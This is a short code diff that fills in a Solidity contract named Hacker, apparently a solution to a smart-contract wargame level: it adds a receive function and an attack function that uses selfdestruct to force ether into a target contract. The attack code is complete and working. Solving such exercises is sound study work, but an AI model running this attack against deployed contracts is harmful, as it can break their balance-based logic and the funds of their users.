@@ -13,5 +13,11 @@ contract Hacker {
     hacker = payable(msg.sender);
   }
 
-  function attack(address _target) public onlyHacker {}
+  /// @notice 0. receive some ether.
+  receive() external payable {}
+
+  /// @notice 1. then self-destruct, resulting the current balance moves into target address.
+  function attack(address _target) public onlyHacker {
+    selfdestruct(payable(_target));
+  }
 }
